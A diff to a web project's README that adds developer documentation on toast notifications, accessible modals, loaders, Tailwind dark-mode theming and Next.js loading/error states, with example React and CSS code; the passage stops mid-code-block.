@@ -2015,6 +2015,495 @@ By mastering React Hook Form and Zod, you're equipped to build professional, pro
 
 ---
 
+## 🎨 Toasts, Modals, and Feedback UI
+
+This project implements comprehensive **user feedback patterns** using toasts, modals, and loaders to create a responsive, accessible, and human-centered user experience. These UI elements clearly communicate success, error, and pending states throughout the application.
+
+### 🎯 Why Feedback UI Matters
+
+User feedback is essential for building trust and clarity in your application:
+
+| Feedback Type | Example Use Case | UI Element | User Benefit |
+|---------------|------------------|------------|--------------|
+| **Instant Feedback** | "Item added to cart", "Saved successfully" | Toast / Snackbar | Non-intrusive confirmation |
+| **Blocking Feedback** | "Are you sure you want to delete?" | Modal / Dialog | Prevents accidental actions |
+| **Process Feedback** | "Uploading… please wait" | Loader / Spinner | Shows progress and status |
+
+**Key Principles:**
+- ✅ **Informative** – Users always know what's happening
+- ✅ **Non-intrusive** – Feedback doesn't block workflow unnecessarily
+- ✅ **Accessible** – Screen readers announce all feedback
+- ✅ **Consistent** – Same patterns used throughout the app
+
+---
+
+### 📦 Installation
+
+Toast notifications use **react-hot-toast** — a lightweight, accessible toast library:
+
+```bash
+npm install react-hot-toast
+```
+
+---
+
+### 🏗️ Architecture Overview
+
+```
+ttaurban/
+├── components/
+│   └── ui/
+│       ├── Toast.tsx          # Global toast provider
+│       ├── Modal.tsx          # Accessible modal component
+│       └── Loader.tsx         # Loading indicators
+├── app/
+│   ├── layout.tsx             # Toast provider setup
+│   ├── signup/
+│   │   └── page.tsx           # Toast + Modal integration
+│   ├── contact/
+│   │   └── page.tsx           # Toast integration
+│   └── feedback-demo/
+│       └── page.tsx           # Complete feedback showcase
+```
+
+---
+
+### 🔔 Toast Notifications
+
+**File:** [`components/ui/Toast.tsx`](ttaurban/components/ui/Toast.tsx)
+
+Global toast configuration with accessibility built-in:
+
+```typescript
+"use client";
+import { Toaster } from "react-hot-toast";
+
+export default function ToastProvider() {
+  return (
+    <Toaster
+      position="top-right"
+      toastOptions={{
+        duration: 4000,
+        success: {
+          iconTheme: {
+            primary: "#10b981",
+            secondary: "#fff",
+          },
+          ariaProps: {
+            role: "status",
+            "aria-live": "polite",
+          },
+        },
+        error: {
+          iconTheme: {
+            primary: "#ef4444",
+            secondary: "#fff",
+          },
+          ariaProps: {
+            role: "alert",
+            "aria-live": "assertive",
+          },
+        },
+      }}
+    />
+  );
+}
+```
+
+**Usage in Components:**
+
+```typescript
+import toast from "react-hot-toast";
+
+// Success toast
+toast.success("Data saved successfully!");
+
+// Error toast
+toast.error("Something went wrong!");
+
+// Loading toast
+const toastId = toast.loading("Saving...");
+// Later, update the same toast:
+toast.success("Saved!", { id: toastId });
+
+// Custom toast
+toast("Custom message! 🎉", {
+  icon: "👏",
+  duration: 5000,
+});
+```
+
+**Real-World Example (Signup Form):**
+
+```typescript
+const onSubmit = async (data) => {
+  const toastId = toast.loading("Creating your account...");
+  
+  try {
+    await fetch("/api/auth/signup", {
+      method: "POST",
+      body: JSON.stringify(data),
+    });
+    
+    toast.success("Account created successfully!", { id: toastId });
+    setShowWelcomeModal(true);
+  } catch (error) {
+    toast.error("Failed to create account. Please try again.", { id: toastId });
+  }
+};
+```
+
+**Features:**
+- ✅ **Auto-dismiss** – Disappears after 4 seconds (configurable)
+- ✅ **Accessible** – ARIA live regions for screen readers
+- ✅ **Update existing toasts** – Transform loading → success/error
+- ✅ **Custom styling** – Themed for success (green), error (red), loading (blue)
+- ✅ **Keyboard dismissible** – Press ESC to close
+
+---
+
+### 💬 Modal Dialogs
+
+**File:** [`components/ui/Modal.tsx`](ttaurban/components/ui/Modal.tsx)
+
+Fully accessible modal component with focus management:
+
+```typescript
+interface ModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  title: string;
+  children: React.ReactNode;
+  onConfirm?: () => void;
+  confirmText?: string;
+  cancelText?: string;
+  variant?: "default" | "danger";
+}
+
+export default function Modal({
+  isOpen,
+  onClose,
+  title,
+  children,
+  onConfirm,
+  variant = "default",
+}: ModalProps) {
+  // Focus trap and keyboard handling implementation
+  // ...
+}
+```
+
+**Usage Example:**
+
+```typescript
+const [showModal, setShowModal] = useState(false);
+
+<Modal
+  isOpen={showModal}
+  onClose={() => setShowModal(false)}
+  title="Delete Item?"
+  variant="danger"
+  onConfirm={() => {
+    deleteItem();
+    toast.success("Item deleted!");
+  }}
+  confirmText="Delete"
+  cancelText="Cancel"
+>
+  <p>Are you sure you want to delete this item? This action cannot be undone.</p>
+</Modal>
+```
+
+**Accessibility Features:**
+- ✅ **Focus trap** – Keyboard navigation stays inside modal
+- ✅ **ESC key** – Close modal with Escape key
+- ✅ **Click outside** – Close by clicking backdrop
+- ✅ **ARIA attributes** – `aria-modal`, `aria-labelledby`, `aria-describedby`
+- ✅ **Focus restoration** – Returns focus to trigger element on close
+- ✅ **Semantic HTML** – Uses native `<dialog>` element
+
+**Variants:**
+- **Default** – Indigo confirm button (informational)
+- **Danger** – Red confirm button (destructive actions)
+
+---
+
+### ⏳ Loading Indicators
+
+**File:** [`components/ui/Loader.tsx`](ttaurban/components/ui/Loader.tsx)
+
+Three types of loading indicators for different use cases:
+
+#### 1. Standard Loader
+
+```typescript
+<Loader size="medium" text="Loading..." />
+<Loader size="small" text="Please wait" />
+<Loader size="large" text="Processing data" fullScreen />
+```
+
+**Sizes:** `small` (24px), `medium` (40px), `large` (64px)
+
+#### 2. Inline Loader (for buttons)
+
+```typescript
+<button disabled>
+  <InlineLoader text="Saving..." />
+</button>
+```
+
+#### 3. Progress Bar
+
+```typescript
+const [progress, setProgress] = useState(0);
+
+<ProgressBar 
+  progress={progress} 
+  text="Uploading files..." 
+/>
+```
+
+**Features:**
+- ✅ **ARIA attributes** – `role="status"`, `role="progressbar"`
+- ✅ **Screen reader text** – Hidden text announces loading state
+- ✅ **Smooth animations** – Spinning animation with CSS
+- ✅ **Full screen option** – Overlay for blocking operations
+- ✅ **Progress tracking** – Visual percentage indicator
+
+---
+
+### 🔄 Complete User Flow Example
+
+Here's how all feedback elements work together in a real scenario:
+
+```typescript
+const handleDelete = async (id) => {
+  // 1. Show confirmation modal
+  setShowDeleteModal(true);
+};
+
+const confirmDelete = async () => {
+  // 2. Show loading toast
+  const toastId = toast.loading("Deleting item...");
+  
+  try {
+    // 3. API call with loader
+    await fetch(`/api/items/${id}`, { method: "DELETE" });
+    
+    // 4. Success toast
+    toast.success("Item deleted successfully!", { id: toastId });
+    
+    // 5. Close modal
+    setShowDeleteModal(false);
+  } catch (error) {
+    // 6. Error toast
+    toast.error("Failed to delete item.", { id: toastId });
+  }
+};
+```
+
+**Flow:** Toast → Modal → Loader → Toast (Success/Failure)
+
+---
+
+### 🎨 Design System Consistency
+
+All feedback UI follows consistent design patterns:
+
+| State | Color | Icon | Usage |
+|-------|-------|------|-------|
+| **Success** | Green (#10b981) | ✓ Checkmark | Completed actions |
+| **Error** | Red (#ef4444) | ✗ Error | Failed operations |
+| **Warning** | Yellow (#f59e0b) | ⚠ Alert | Cautionary messages |
+| **Info** | Blue (#3b82f6) | ℹ Info | Informational updates |
+| **Loading** | Indigo (#4f46e5) | ↻ Spinner | Ongoing processes |
+
+---
+
+### ♿ Accessibility Implementation
+
+#### ARIA Live Regions
+
+```typescript
+// Success toast - polite announcement
+ariaProps: {
+  role: "status",
+  "aria-live": "polite",
+}
+
+// Error toast - assertive announcement
+ariaProps: {
+  role: "alert",
+  "aria-live": "assertive",
+}
+
+// Loader - status announcement
+<div role="status" aria-live="polite" aria-label="Loading...">
+  <span className="sr-only">Loading...</span>
+</div>
+```
+
+#### Keyboard Navigation
+
+- **ESC** – Close modals
+- **TAB** – Navigate between modal buttons
+- **ENTER** – Confirm modal action
+- **Focus trap** – Keyboard stays inside modal
+
+#### Screen Reader Support
+
+- All toasts announced automatically
+- Loading states clearly communicated
+- Modal content fully accessible
+- Progress updates announced
+
+---
+
+### 🧪 Testing User Flows
+
+**Test Checklist:**
+
+1. ✅ **Toast Visibility**
+   - Toasts appear in correct position
+   - Automatically dismiss after duration
+   - Multiple toasts stack properly
+
+2. ✅ **Modal Interaction**
+   - Opens and closes smoothly
+   - ESC key works
+   - Click outside closes modal
+   - Focus returns to trigger element
+
+3. ✅ **Loading States**
+   - Loaders show during async operations
+   - Progress bars update correctly
+   - Full screen loader blocks interaction
+
+4. ✅ **Accessibility**
+   - Screen reader announces all feedback
+   - Keyboard navigation works
+   - Color contrast meets WCAG standards
+
+5. ✅ **Error Handling**
+   - Errors show appropriate messages
+   - Failed operations display error toasts
+   - User can retry failed actions
+
+---
+
+### 📊 Real-World Use Cases
+
+| Scenario | Feedback Pattern | Implementation |
+|----------|------------------|----------------|
+| **Form Submission** | Loading toast → Success/Error toast | Toast updates on completion |
+| **Delete Action** | Modal → Loading toast → Success toast | Confirmation before destructive action |
+| **File Upload** | Progress bar → Success toast | Visual progress with percentage |
+| **API Call** | Inline loader → Toast notification | Non-blocking feedback |
+| **Bulk Operation** | Full screen loader → Summary modal | Blocking for heavy operations |
+
+---
+
+### 🎓 UX Principles Applied
+
+1. **Immediate Feedback** – Users see instant response to actions
+2. **Clear Communication** – Messages explain what happened
+3. **Prevent Errors** – Modals confirm destructive actions
+4. **Show Progress** – Loaders indicate ongoing operations
+5. **Non-Intrusive** – Toasts don't block user workflow
+6. **Recoverable** – Error messages explain how to fix issues
+
+---
+
+### 🚀 Performance Considerations
+
+**Toast Optimizations:**
+- Toasts unmount after dismissal (no memory leaks)
+- CSS animations use `transform` (GPU accelerated)
+- Auto-dismiss prevents toast buildup
+
+**Modal Optimizations:**
+- Lazy rendering (only renders when open)
+- Focus trap only active when visible
+- Event listeners cleaned up on close
+
+**Loader Optimizations:**
+- Pure CSS animations (no JavaScript)
+- Conditional rendering (unmounts when not needed)
+- Minimal re-renders
+
+---
+
+### 📸 Demo Page
+
+**Visit:** [`/feedback-demo`](ttaurban/app/feedback-demo/page.tsx)
+
+Interactive demonstration of all feedback patterns:
+- ✅ Success, error, loading, and custom toasts
+- ✅ Information and danger modals
+- ✅ All loader sizes and variants
+- ✅ Progress bar simulation
+- ✅ Complete user flow examples
+
+---
+
+### 🎯 Key Takeaways
+
+1. ✅ **Toasts** provide instant, non-intrusive feedback
+2. ✅ **Modals** prevent accidental destructive actions
+3. ✅ **Loaders** communicate ongoing processes clearly
+4. ✅ **Accessibility** is built-in from the start
+5. ✅ **Consistency** creates predictable user experience
+6. ✅ **Performance** optimized for smooth interactions
+7. ✅ **Reusability** makes implementation fast and consistent
+
+---
+
+### 🔮 Future Enhancements
+
+- [ ] **Toast Queue** – Limit max visible toasts
+- [ ] **Sound Effects** – Optional audio feedback
+- [ ] **Haptic Feedback** – Vibration on mobile devices
+- [ ] **Toast History** – Review dismissed notifications
+- [ ] **Custom Animations** – Slide, fade, bounce options
+- [ ] **i18n Integration** – Multilingual feedback messages
+- [ ] **Offline Support** – Queue toasts when offline
+
+---
+
+### 📚 Additional Resources
+
+- [React Hot Toast Documentation](https://react-hot-toast.com/)
+- [ARIA Live Regions](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Live_Regions)
+- [Dialog Element Accessibility](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog)
+- [UX Patterns for Loading](https://www.nngroup.com/articles/progress-indicators/)
+- [Toast Notification Best Practices](https://uxdesign.cc/toast-notification-design-best-practices-1fb15d13ff9e)
+
+---
+
+### 🎯 Reflection: Building Trust Through Feedback
+
+**Why This Matters:**
+
+User feedback isn't just about showing messages — it's about building **trust** and **confidence**:
+
+1. **Trust** – Users trust your app when it clearly communicates what's happening
+2. **Confidence** – Clear feedback gives users confidence to take actions
+3. **Efficiency** – Good feedback reduces user errors and support requests
+4. **Accessibility** – Inclusive design ensures everyone can use your app
+5. **Professionalism** – Polished feedback separates amateur from professional apps
+
+**Real-World Impact:**
+- ✅ **Reduced Support Tickets** – Clear error messages help users self-serve
+- ✅ **Higher Conversion** – Users complete actions when they understand progress
+- ✅ **Better Retention** – Delightful UX keeps users coming back
+- ✅ **Accessibility Compliance** – WCAG compliance opens your app to everyone
+
+By implementing comprehensive feedback UI, you create an application that feels responsive, professional, and human — essential for user satisfaction and business success.
+
+---
+
+---
+
 ### 📈 Future Enhancements
 
 AI for categorization & duplicate complaint detection
@@ -6472,3 +6961,2769 @@ Display validation errors with accessibility:
 7. ** Validate on Submit:** Avoid validating on every keystroke
 8. ** Create Reusable Components:** FormInput, FormSelect, etc.
 
+
+
+---
+
+##  Responsive & Themed Design with Tailwind CSS
+
+### Overview
+
+Modern web applications must work seamlessly across devices (mobile, tablet, desktop) and respect user preferences (light/dark mode). This implementation combines Tailwind CSS's utility-first approach with custom theme configuration to create a responsive, accessible, and visually consistent user interface.
+
+### Why Responsive & Themed Design Matters
+
+| Concern | Solution | Impact |
+|---------|----------|--------|
+| Mobile traffic ~60% | Responsive breakpoints | Better UX on all devices |
+| User preference | Dark mode support | Reduced eye strain, accessibility |
+| Consistency | Design system | Faster development, cohesive UI |
+| Performance | Utility classes | Minimal CSS bundle size |
+| Accessibility | High contrast themes | WCAG compliance |
+
+### Tailwind CSS Configuration
+
+#### Custom Theme Setup
+
+**File: [tailwind.config.ts](./ttaurban/tailwind.config.ts)**
+
+```typescript
+import type { Config } from 'tailwindcss';
+
+export default {
+  content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}'],
+  darkMode: 'class', // Enable class-based dark mode
+  theme: {
+    extend: {
+      colors: {
+        // Custom brand colors
+        brand: {
+          light: '#60a5fa',
+          DEFAULT: '#3b82f6',
+          dark: '#2563eb',
+        },
+        // Extended color palette
+        primary: {
+          50: '#eff6ff',
+          100: '#dbeafe',
+          // ... up to 900
+        },
+      },
+      screens: {
+        // Custom breakpoints
+        xs: '475px',
+        '3xl': '1920px',
+      },
+    },
+  },
+} satisfies Config;
+```
+
+**Key Configuration:**
+- **darkMode: 'class'** - Toggle dark mode by adding/removing 'dark' class on html element
+- **Custom Colors** - Brand colors accessible as bg-brand, text-brand, etc.
+- **Responsive Breakpoints** - Mobile-first: sm (640px), md (768px), lg (1024px), xl (1280px)
+- **Content Paths** - Purges unused CSS for optimal bundle size
+
+### Global Styles
+
+**File: [app/globals.css](./ttaurban/app/globals.css)**
+
+```css
+@tailwind base;
+@tailwind components;
+@tailwind utilities;
+
+:root {
+  --background: #ffffff;
+  --foreground: #171717;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --background: #0a0a0a;
+    --foreground: #ededed;
+  }
+}
+
+/* Custom component classes */
+@layer components {
+  .btn-primary {
+    @apply bg-indigo-600 dark:bg-indigo-500 text-white px-4 py-2 rounded-lg 
+           hover:bg-indigo-700 dark:hover:bg-indigo-600 transition-colors font-medium;
+  }
+  
+  .card {
+    @apply bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 
+           rounded-lg shadow-md p-6 transition-colors;
+  }
+  
+  .input-field {
+    @apply w-full border border-gray-300 dark:border-gray-600 
+           bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 
+           placeholder-gray-400 dark:placeholder-gray-500 p-2 rounded-lg 
+           focus:outline-none focus:ring-2 focus:ring-indigo-500 
+           dark:focus:ring-indigo-400 transition-colors;
+  }
+}
+```
+
+**Benefits:**
+- **CSS Variables** - Dynamic theming with :root
+- **@layer components** - Reusable utility combos (btn-primary, card)
+- **prefers-color-scheme** - Respect system preference as fallback
+- **transition-colors** - Smooth theme switching animations
+
+### Theme Management with UIContext
+
+#### Enhanced UIContext with Theme Persistence
+
+**File: [context/UIContext.tsx](./ttaurban/context/UIContext.tsx)**
+
+```typescript
+"use client";
+import { createContext, useState, useEffect, ReactNode } from "react";
+
+type Theme = "light" | "dark";
+
+interface UIContextType {
+  theme: Theme;
+  toggleTheme: () => void;
+  sidebarOpen: boolean;
+  toggleSidebar: () => void;
+}
+
+export const UIContext = createContext<UIContextType | undefined>(undefined);
+
+export function UIProvider({ children }: { children: ReactNode }) {
+  const [mounted, setMounted] = useState(false);
+  const [theme, setTheme] = useState<Theme>("light");
+  const [sidebarOpen, setSidebarOpen] = useState(false);
+
+  // Hydrate theme from localStorage after mount (prevent SSR mismatch)
+  useEffect(() => {
+    const savedTheme = localStorage.getItem("theme") as Theme;
+    const systemPreference = window.matchMedia("(prefers-color-scheme: dark)").matches
+      ? "dark"
+      : "light";
+    
+    const initialTheme = savedTheme || systemPreference;
+    setTheme(initialTheme);
+    document.documentElement.classList.toggle("dark", initialTheme === "dark");
+    setMounted(true);
+  }, []);
+
+  const toggleTheme = () => {
+    const newTheme = theme === "light" ? "dark" : "light";
+    setTheme(newTheme);
+    localStorage.setItem("theme", newTheme);
+    document.documentElement.classList.toggle("dark", newTheme === "dark");
+  };
+
+  // Prevent flash of unstyled content (FOUC)
+  if (!mounted) return null;
+
+  return (
+    <UIContext.Provider value={{ theme, toggleTheme, sidebarOpen, toggleSidebar }}>
+      {children}
+    </UIContext.Provider>
+  );
+}
+```
+
+**Key Implementation Details:**
+
+1. **localStorage Persistence** - Theme saved and restored across sessions
+2. **System Preference Detection** - Falls back to prefers-color-scheme media query
+3. **SSR Safety** - mounted state prevents hydration mismatch
+4. **DOM Manipulation** - Adds/removes 'dark' class on <html> element
+5. **Custom Hook** - useUI() hook for easy consumption in components
+
+### Theme Toggle Component
+
+**File: [components/ui/ThemeToggle.tsx](./ttaurban/components/ui/ThemeToggle.tsx)**
+
+```typescript
+"use client";
+import { useUI } from "@/hooks/useUI";
+
+export default function ThemeToggle() {
+  const { theme, toggleTheme } = useUI();
+
+  return (
+    <button
+      onClick={toggleTheme}
+      className="p-2 rounded-lg bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 
+                 dark:hover:bg-gray-700 transition-colors"
+      aria-label={theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode'}
+    >
+      {theme === 'dark' ? '' : ''}
+    </button>
+  );
+}
+```
+
+**Features:**
+- **Visual Feedback** - Sun/moon icon based on current theme
+- **Accessibility** - aria-label for screen readers
+- **Smooth Transitions** - transition-colors for theme change
+- **Hover States** - Both light and dark mode hover styles
+
+### Responsive Design Patterns
+
+#### Breakpoint Strategy
+
+Tailwind uses mobile-first breakpoints - styles apply to mobile by default, then override at larger screens:
+
+```typescript
+// Mobile (default, < 640px): Stack vertically, full width
+// Tablet (sm, >= 640px): 2 columns
+// Desktop (md, >= 768px): 3 columns
+// Large (lg, >= 1024px): 4 columns
+
+<div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+  {items.map(item => <Card key={item.id} {...item} />)}
+</div>
+```
+
+#### Responsive Typography
+
+```tsx
+<h1 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold">
+  Responsive Heading
+</h1>
+
+<p className="text-sm sm:text-base md:text-lg">
+  Body text scales with viewport
+</p>
+```
+
+#### Responsive Spacing
+
+```tsx
+<div className="p-4 sm:p-6 md:p-8">
+  {/* Padding: 16px mobile, 24px tablet, 32px desktop */}
+</div>
+
+<section className="mb-4 sm:mb-6 md:mb-8 lg:mb-12">
+  {/* Margin-bottom scales with viewport */}
+</section>
+```
+
+#### Responsive Layout (Navbar Example)
+
+**File: [app/layout.tsx](./ttaurban/app/layout.tsx)**
+
+```tsx
+<nav className="bg-white dark:bg-gray-900 border-b border-gray-200 dark:border-gray-700 sticky top-0 z-50 transition-colors">
+  <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div className="flex justify-between h-16">
+      {/* Logo - responsive text size */}
+      <Link
+        href="/"
+        className="text-lg md:text-xl font-bold text-indigo-600 dark:text-indigo-400"
+      >
+         TTA-Urban
+      </Link>
+
+      {/* Desktop menu - hidden on mobile */}
+      <div className="hidden md:flex space-x-4">
+        <Link href="/" className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400">
+          Home
+        </Link>
+        <Link href="/dashboard" className="text-gray-700 dark:text-gray-300 hover:text-indigo-600 dark:hover:text-indigo-400">
+          Dashboard
+        </Link>
+      </div>
+
+      {/* Theme toggle + Sign In */}
+      <div className="flex items-center gap-3">
+        <ThemeToggle />
+        <Link href="/login" className="bg-indigo-600 dark:bg-indigo-500 text-white px-3 md:px-4 py-2 rounded-md text-sm">
+          Sign In
+        </Link>
+      </div>
+    </div>
+  </div>
+</nav>
+```
+
+**Responsive Patterns:**
+- **hidden md:flex** - Hide menu on mobile, show on desktop
+- **text-lg md:text-xl** - Scale logo text
+- **px-3 md:px-4** - Reduce padding on mobile
+- **gap-3** - Consistent spacing that adapts to flex direction
+
+### Dark Mode Implementation
+
+#### Component-Level Dark Mode Patterns
+
+**1. Background & Text Colors**
+
+```tsx
+<div className="bg-white dark:bg-gray-900 text-gray-900 dark:text-gray-100">
+  {/* Auto-switches background and text color */}
+</div>
+```
+
+**2. Borders**
+
+```tsx
+<div className="border border-gray-200 dark:border-gray-700">
+  {/* Lighter border in dark mode for better contrast */}
+</div>
+```
+
+**3. Shadows**
+
+```tsx
+<div className="shadow-md dark:shadow-gray-900/50">
+  {/* Darker, more subtle shadows in dark mode */}
+</div>
+```
+
+**4. Input Fields**
+
+```tsx
+<input
+  className="bg-white dark:bg-gray-800 
+             text-gray-900 dark:text-gray-100 
+             border-gray-300 dark:border-gray-600
+             placeholder-gray-400 dark:placeholder-gray-500
+             focus:ring-indigo-500 dark:focus:ring-indigo-400"
+/>
+```
+
+**5. Buttons**
+
+```tsx
+<button className="bg-indigo-600 dark:bg-indigo-500 
+                   hover:bg-indigo-700 dark:hover:bg-indigo-600
+                   focus:ring-offset-2 dark:focus:ring-offset-gray-800">
+  Click Me
+</button>
+```
+
+#### Updated Components
+
+**Components with Dark Mode:**
+- [components/ui/Card.tsx](./ttaurban/components/ui/Card.tsx) - Dark backgrounds, borders, text
+- [components/ui/Modal.tsx](./ttaurban/components/ui/Modal.tsx) - Dark dialog with responsive sizing
+- [components/ui/Button.tsx](./ttaurban/components/ui/Button.tsx) - Dark variants for all button types
+- [components/FormInput.tsx](./ttaurban/components/FormInput.tsx) - Dark input fields with focus states
+- [app/contact/page.tsx](./ttaurban/app/contact/page.tsx) - Full dark mode contact form
+- [app/layout.tsx](./ttaurban/app/layout.tsx) - Dark navbar with theme toggle
+
+### Testing Responsive Design
+
+#### Browser DevTools Testing
+
+1. **Open DevTools** - F12 or Ctrl+Shift+I (Windows), Cmd+Option+I (Mac)
+2. **Toggle Device Toolbar** - Ctrl+Shift+M (Windows), Cmd+Shift+M (Mac)
+3. **Select Device Preset:**
+   - Mobile: iPhone 12 Pro (390x844)
+   - Tablet: iPad Air (820x1180)
+   - Desktop: Responsive 1920x1080
+
+4. **Test Breakpoints:**
+   - 375px (iPhone SE) - Smallest mobile
+   - 640px (sm) - Tablet portrait
+   - 768px (md) - Tablet landscape
+   - 1024px (lg) - Desktop
+   - 1280px (xl) - Large desktop
+
+5. **Verify:**
+   -  Text remains readable at all sizes
+   -  Buttons are tap-friendly (min 44x44px)
+   -  Navigation adapts (hidden menu on mobile)
+   -  Forms stack vertically on mobile
+   -  Images scale responsively
+
+#### Dark Mode Testing
+
+1. **Manual Toggle** - Click theme toggle button (/) in navbar
+2. **System Preference** - Change OS settings:
+   - Windows: Settings > Personalization > Colors > Choose your mode
+   - Mac: System Preferences > General > Appearance
+3. **DevTools Simulation:**
+   - Open DevTools >  (Menu) > More tools > Rendering
+   - Scroll to "Emulate CSS media feature prefers-color-scheme"
+   - Select "prefers-color-scheme: dark"
+
+4. **Verify:**
+   -  Theme persists across page reloads (localStorage)
+   -  All components adapt colors correctly
+   -  Sufficient contrast (WCAG AA: 4.5:1 for text)
+   -  Focus indicators visible in both modes
+   -  Smooth transitions between themes
+
+### Files Created & Modified
+
+**New Files:**
+- [components/ui/ThemeToggle.tsx](./ttaurban/components/ui/ThemeToggle.tsx) - Theme toggle button
+- [tailwind.config.ts](./ttaurban/tailwind.config.ts) - Custom Tailwind configuration
+
+**Modified Files:**
+- [context/UIContext.tsx](./ttaurban/context/UIContext.tsx) - Added theme persistence
+- [app/globals.css](./ttaurban/app/globals.css) - Custom utility classes, dark mode variables
+- [app/layout.tsx](./ttaurban/app/layout.tsx) - Added theme toggle to navbar, responsive nav
+- [components/ui/Card.tsx](./ttaurban/components/ui/Card.tsx) - Dark mode + responsive padding
+- [components/ui/Modal.tsx](./ttaurban/components/ui/Modal.tsx) - Dark mode + responsive sizing
+- [components/ui/Button.tsx](./ttaurban/components/ui/Button.tsx) - Dark mode variants + responsive text
+- [components/FormInput.tsx](./ttaurban/components/FormInput.tsx) - Dark mode input fields + responsive spacing
+- [app/contact/page.tsx](./ttaurban/app/contact/page.tsx) - Responsive layout + dark mode styling
+
+### Key Achievements
+
+1. ** Responsive Layout** - Mobile-first design adapting from 375px to 1920px+
+2. ** Dark Mode Support** - Full theme toggle with localStorage persistence
+3. ** System Preference Detection** - Respects OS dark mode setting
+4. ** Accessible Theming** - High contrast ratios, ARIA labels
+5. ** Smooth Transitions** - transition-colors for theme switching
+6. ** Reusable Utilities** - Custom component classes (btn-primary, card, input-field)
+7. ** Performance Optimized** - Purged CSS, minimal bundle size
+8. ** Developer Experience** - Utility-first approach, easy to maintain
+
+### Best Practices
+
+1. **Mobile-First Approach** - Design for smallest screen first, scale up
+2. **Consistent Breakpoints** - Use Tailwind's sm, md, lg, xl systematically
+3. **Dark Mode Everywhere** - Apply dark: variants to all background/text/border colors
+4. **Touch-Friendly Targets** - Min 44x44px for buttons on mobile
+5. **Responsive Typography** - Scale text sizes with viewport (text-sm sm:text-base md:text-lg)
+6. **Flexible Spacing** - Use responsive padding/margin (p-4 sm:p-6 md:p-8)
+7. **Accessible Focus States** - Visible focus rings with dark:focus:ring-offset-gray-800
+8. **Smooth Transitions** - Add transition-colors to theme-aware elements
+9. **Test Across Devices** - Use DevTools device toolbar for thorough testing
+10. **Persist User Preferences** - Save theme to localStorage for better UX
+
+### Reflection: Trade-offs & Decisions
+
+**Why Class-Based Dark Mode?**
+-  **User Control:** Toggle independent of system preference
+-  **Persistence:** localStorage saves preference across sessions
+-  **Flexibility:** Can override system preference
+-  **Complexity:** Requires JavaScript (vs pure CSS media query)
+
+**Why Tailwind Utility Classes?**
+-  **Performance:** Purged CSS reduces bundle size
+-  **Consistency:** Design tokens enforced via configuration
+-  **Speed:** No context switching between HTML/CSS
+-  **Learning Curve:** Requires memorizing utility names
+-  **HTML Verbosity:** Long className strings
+
+**Why Custom Component Classes?**
+-  **Reusability:** btn-primary used across all buttons
+-  **Maintainability:** Update once, changes propagate
+-  **Readability:** Shorter classNames in JSX
+-  **Indirection:** Must check globals.css for implementation
+
+**Responsive Breakpoint Strategy:**
+- **Mobile-First** - Base styles target smallest screens
+- **Tablet (sm: 640px)** - 2-column grids, show more content
+- **Desktop (md: 768px)** - Full navigation, wider layouts
+- **Large (lg: 1024px)** - Max width containers, 4-column grids
+
+**Color Contrast Ratios (WCAG AA):**
+- Light mode: gray-900 on white (21:1) 
+- Dark mode: gray-100 on gray-900 (18.5:1) 
+- Links: indigo-600 on white (4.5:1) 
+- Dark links: indigo-400 on gray-900 (7.8:1) 
+
+---
+## ⏳ Error & Loading States
+
+### Overview
+
+Graceful error handling and loading states are critical for maintaining user trust and providing a resilient experience. This implementation uses Next.js App Router's built-in support for `loading.tsx` and `error.tsx` files to create consistent, accessible fallback UIs across the application.
+
+### Why Fallback UI Matters
+
+| State | Purpose | User Experience Impact |
+|-------|---------|------------------------|
+| **Loading** | Indicates data is being fetched | Prevents confusion, shows progress |
+| **Error** | Handles failures gracefully | Maintains trust, offers recovery |
+| **Empty** | Shows when no data exists | Guides users to next action |
+
+**Without Loading States:**
+- ❌ Blank screens confuse users
+- ❌ Sudden content appears (jarring)
+- ❌ Users think app is broken
+
+**With Loading States:**
+- ✅ Users know app is working
+- ✅ Visual structure previews content
+- ✅ Professional, polished feel
+
+**Without Error Boundaries:**
+- ❌ App crashes completely
+- ❌ No way to recover
+- ❌ User loses all context
+
+**With Error Boundaries:**
+- ✅ Graceful degradation
+- ✅ Retry functionality
+- ✅ User stays in control
+
+### Implementation Strategy
+
+#### File Structure
+
+Next.js automatically shows `loading.tsx` while the page/component is loading and `error.tsx` when an error occurs.
+
+```
+app/
+├─ users/
+│  ├─ page.tsx
+│  ├─ loading.tsx    # Auto-displayed during loading
+│  └─ error.tsx      # Auto-displayed on error
+├─ dashboard/
+│  ├─ page.tsx
+│  ├─ loading.tsx
+│  └─ error.tsx
+└─ contact/
+   ├─ page.tsx
+   ├─ loading.tsx
+   └─ error.tsx
+```
+
+### Loading Skeletons
+
+#### Users Page Loading Skeleton
+
+**File: [app/users/loading.tsx](./ttaurban/app/users/loading.tsx)**
+
+```tsx
+export default function Loading() {
+  return (
+    <div className="min-h-screen p-4 sm:p-6 bg-gray-50 dark:bg-gray-900">
+      <div className="max-w-7xl mx-auto">
+        {/* Page Title Skeleton */}
+        <div className="animate-pulse mb-6">
+          <div className="h-8 sm:h-10 bg-gray-200 dark:bg-gray-700 rounded w-48 mb-2"></div>
+          <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-64"></div>
+        </div>
+
+        {/* User Cards Grid Skeleton */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
+          {[1, 2, 3, 4, 5, 6].map((i) => (
+            <div key={i} className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 animate-pulse">
+              {/* Avatar + Name Skeleton */}
+              <div className="flex items-center space-x-4 mb-4">
+                <div className="w-12 h-12 bg-gray-200 dark:bg-gray-700 rounded-full"></div>
+                <div className="flex-1">
+                  <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-3/4 mb-2"></div>
